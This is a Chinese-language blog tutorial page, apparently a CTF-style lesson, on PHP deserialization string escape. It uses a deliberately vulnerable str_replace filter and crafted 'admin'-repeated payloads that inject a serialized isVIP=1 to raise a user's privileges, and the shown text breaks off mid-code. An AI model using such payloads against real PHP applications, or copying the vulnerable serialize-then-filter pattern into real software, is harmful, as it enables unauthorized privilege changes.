@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>php反序列化字符串逃逸;.md | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="产生原理 当开发者先将对象序列化，然后对序列化后的字符串进行过滤过滤，最后在进行反序列化。这个时候可能会产生php发序列化字符串逃逸的漏洞 对于php反序列化字符逃逸 可以分为一下两种情况进行讨论 过滤后字符变多 过滤后字符变少 先来看一下过滤后字符变多的情况1234567891011 class user&amp;#123;public $username;public $password;public">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化字符串逃逸;.md">
+<meta property="og:url" content="http://example.com/2022/06/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8-md/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="产生原理 当开发者先将对象序列化，然后对序列化后的字符串进行过滤过滤，最后在进行反序列化。这个时候可能会产生php发序列化字符串逃逸的漏洞 对于php反序列化字符逃逸 可以分为一下两种情况进行讨论 过滤后字符变多 过滤后字符变少 先来看一下过滤后字符变多的情况1234567891011 class user&amp;#123;public $username;public $password;public">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/006nKnK0ly1h3h4bhebqlj31wa11fwwt.jpg">
+<meta property="og:image" content="https://image.3001.net/images/20210824/1629789872_61249eb02bbee76c99777.png">
+<meta property="og:image" content="https://image.3001.net/images/20210824/1629789872_61249eb06d3f49c802d31.png">
+<meta property="og:image" content="https://image.3001.net/images/20210824/1629789872_61249eb0ac0a40a44c51a.png">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/006nKnK0ly1h3h4e6hqv6j31qp10g4ci.jpg">
+<meta property="article:published_time" content="2022-06-22T09:44:45.000Z">
+<meta property="article:modified_time" content="2022-06-22T09:45:09.743Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva3.sinaimg.cn/large/006nKnK0ly1h3h4bhebqlj31wa11fwwt.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-php反序列化字符串逃逸-md" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/06/22/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8-md/" class="article-date">
+  <time class="dt-published" datetime="2022-06-22T09:44:45.000Z" itemprop="datePublished">2022-06-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      php反序列化字符串逃逸;.md
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>产生原理</p>
+<p>当开发者先将对象序列化，然后对序列化后的字符串进行过滤过滤，最后在进行反序列化。这个时候可能会产生php发序列化字符串逃逸的漏洞</p>
+<p>对于php反序列化字符逃逸 可以分为一下两种情况进行讨论</p>
+<p>过滤后字符变多</p>
+<p>过滤后字符变少</p>
+<h2 id="先来看一下过滤后字符变多的情况"><a href="#先来看一下过滤后字符变多的情况" class="headerlink" title="先来看一下过滤后字符变多的情况"></a>先来看一下过滤后字符变多的情况</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>当类初始化的时候u和p会赋值我们传入对的参数</p>
+<p>而isvip只能是0 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个时候增加一个函数来过滤amdin并且把admin换车hacker</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>所以整个代码就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line">​</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>这个程序输出</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hacker&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;i:<span class="number">0</span>;&#125; </span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们把过滤前和过滤后的拿出来对比一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;  //未过滤</span><br><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; //已过滤 </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们发现过滤后比过滤前多了一个字符</p>
+<p>因为hacker比admin多了一个字符嘛</p>
+<p>所以就会不一样</p>
+<p>现在这个admin就是我们的可控变量</p>
+<p>接下来我们打算把isvip的值改为1</p>
+<p>现在我们 把现有子串和目标字串进行对比</p>
+<p>子串就是我们可改变值后面的东西（个人理解）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;//现有</span><br><span class="line"></span><br><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;//目标</span><br></pre></td></tr></table></figure>
+
+<p>也就是说我们要在admin这个可控变量的位置注入我们的目标子串</p>
+<p>首先计算目标子串的长度 </p>
+<p>这个子串长度为47（可以用在线网站计算 也可以自己写个函数嘛很简单）</p>
+<p>所以我们现在确定了需要逃逸的字符串长度为47</p>
+<p>刚才我们知道了过滤之后我们的字符串多了一个</p>
+<p>所以我们要在admin这个可控变量这个位置注入我们的目标子串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125; </span><br></pre></td></tr></table></figure>
+
+<p>因为目标字串的长度为47，并且admin每次过滤之后就会变成hacker也就是说没出现一个admin就会多一个字符</p>
+<p>这里看不懂没啥大问题 继续往下看</p>
+<p>我们在可控变量这里重复47次admin </p>
+<p>然后加上目标子串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>完整代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>输出如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>因为每次过滤之后都会字符串加一嘛</p>
+<p>所以我们就可以让过我们输入的admin加上我们目标字符串的长度等于过滤后hacker的长度所以就可以把后面我们的目标子串当成正常的属性 这样就可以修改属性了</p>
+<p>这样后面的这个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>就会被抛弃</p>
+<p>序列化后，多余的子串就会被抛弃</p>
+<p>然后我们验证一下我们刚才的做法</p>
+<p>我们把序列化后的东西反序列化一下看看结果</p>
+<p>这样我们就成功的把isvip改为1了</p>
+<p><img src="https://tva3.sinaimg.cn/large/006nKnK0ly1h3h4bhebqlj31wa11fwwt.jpg" alt="1655686721009"></p>
+<h2 id="接下来我们看过滤后字符串变少的情况"><a href="#接下来我们看过滤后字符串变少的情况" class="headerlink" title="接下来我们看过滤后字符串变少的情况"></a>接下来我们看过滤后字符串变少的情况</h2><p>这里只是把hacker改为了hack</p>
+<p>代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>结果如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hack&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;i:<span class="number">0</span>;&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>同样对比目标字串和现有子串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;	//现有子串</span><br><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;	//目标子串 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>过滤的时候会减少一个字符</p>
+<p>还是计算目标字串长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;	//目标子串 47</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在计算到下一个可控变量的长度（下一个可控变量为password的值）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;</span><br><span class="line">//长度为22 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>因为每次过滤都会少一个字符所以我们将admin重复22遍</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:105:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：</strong>PHP反序列化的机制是，比如如果前面是规定了有10个字符，但是只读到了9个就到了双引号，这个时候PHP会把双引号当做第10个字符，也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。</p>
+<p> 这里我们需要仔细看一下<strong>s</strong>后面是<strong>105</strong>，也就是说我们需要读取到<strong>105</strong>个字符。从第一个引号开始，105个字符如下： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:6: </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://image.3001.net/images/20210824/1629789872_61249eb02bbee76c99777.png" alt="img"> </p>
+<p> 也就是说<strong>123456</strong>这个地方成为了我们的可控变量，在<strong>123456</strong>可控变量的位置中添加我们的目标子串 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>完整代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span 